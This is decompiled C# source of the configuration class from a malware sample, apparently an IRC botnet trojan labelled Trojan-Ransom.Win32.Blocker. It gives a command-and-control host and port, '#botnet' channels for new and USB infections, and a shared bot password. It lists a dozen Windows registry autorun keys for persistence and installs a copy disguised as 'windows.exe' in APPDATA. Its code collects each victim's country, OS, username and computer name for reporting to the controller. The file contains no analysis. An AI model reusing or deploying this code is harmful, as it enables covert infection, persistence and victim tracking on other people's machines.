// Decompiled with JetBrains decompiler
// Type: rundll32.config
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Windows.Forms;

namespace rundll32
{
  internal class config
  {
    public static string version = "v0.1";
    public static string host = "bnet.uniquefraud.org";
    public static int port = 6667;
    public static string pass = (string) null;
    public static string prefixC = "|";
    public static string manualC = "M";
    public static string newC = "N";
    public static string usbC = "U";
    public static string nick = "[%os%|%country%|%rand%|%c%]";
    public static string user = "Merqy[%user%@%pc%]";
    public static string mutex = "{HaveANiceDay-TeamMerqy}";
    public static string[] keys = new string[12]
    {
      "Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
      "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
      "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
      "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load",
      "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify",
      "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
      "Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
      "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler"
    };
    public static string[][] dirs = new string[1][]
    {
      new string[2]
      {
        Environment.GetEnvironmentVariable("APPDATA"),
        ""
      }
    };
    public static string[][] names = new string[1][]
    {
      new string[2]{ "windows.exe", "Windows" }
    };
    public static string channel = "#botnet";
    public static string channelPwd = (string) null;
    public static string[][] onConnChannels = new string[2][]
    {
      new string[2]{ config.channel, config.channelPwd },
      new string[2]
      {
        config.channel + ".%country%",
        config.channelPwd
      }
    };
    public static string[][] onNewInfectionChannels = new string[1][]
    {
      new string[2]{ config.channel + ".new", config.channelPwd }
    };
    public static string[][] onUsbInfectionChannels = new string[1][]
    {
      new string[2]{ config.channel + ".usb", config.channelPwd }
    };
    public static string pwd = "sani_one";
    public static string loginPwd = config.pwd;
    public static string remPwd = config.pwd;
    public static string updatePwd = config.pwd;
    public static string ftp_host = "";
    public static int ftp_port = 21;
    public static string ftp_user = "";
    public static string ftp_pass = "";
    public static string ftp_path = "";
    public static int im_msn_interval = 5000;

    public static void loadVars()
    {
      functionParser.Variables.Add(new functionVariable("false", (object) false));
      functionParser.Variables.Add(new functionVariable("true", (object) true));
      functionParser.Variables.Add(new functionVariable("False", (object) false));
      functionParser.Variables.Add(new functionVariable("True", (object) true));
      functionParser.Variables.Add(new functionVariable("ver", (object) config.version));
      string newValue = "";
      if (Program.firstRun)
        newValue += config.newC;
      if (Program.usbRun)
        newValue += config.usbC;
      if (newValue == "")
        newValue += config.manualC;
      string loc = misc.getLoc();
      string os = misc.getOS();
      string computerName = SystemInformation.ComputerName;
      string userName = Environment.UserName;
      config.nick = config.nick.Replace("%country%", loc).Replace("%os%", os).Replace("%user%", userName).Replace("%pc%", computerName).Replace("%c%", newValue);
      config.user = config.user.Replace("%country%", loc).Replace("%os%", os).Replace("%user%", userName).Replace("%pc%", computerName).Replace("%c%", newValue);
      foreach (string[] onConnChannel in config.onConnChannels)
        onConnChannel[0] = onConnChannel[0].Replace("%country%", loc);
    }
  }
}
